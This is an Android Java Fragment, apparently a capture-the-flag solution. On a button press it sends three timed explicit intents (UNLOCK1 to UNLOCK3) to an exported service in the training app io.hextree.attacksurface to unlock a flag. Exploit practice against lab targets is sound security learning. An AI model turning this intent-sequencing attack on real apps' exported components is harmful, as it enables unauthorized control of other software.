package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag25Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag25, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag25);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service"));
            Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(() -> {
                intent.setAction("io.hextree.services.UNLOCK1");
                getContext().startService(intent);
            }, 0);

            // Step 2: BUILD_ACTION
            handler.postDelayed(() -> {
                intent.setAction("io.hextree.services.UNLOCK2");
                getContext().startService(intent);
            }, 1000); // 1 second later

            // Step 3: GET_FLAG_ACTION
            handler.postDelayed(() -> {
                intent.setAction("io.hextree.services.UNLOCK3");
                getContext().startService(intent);
            }, 2000); // 2 seconds later
        });
        return view;
    }
} 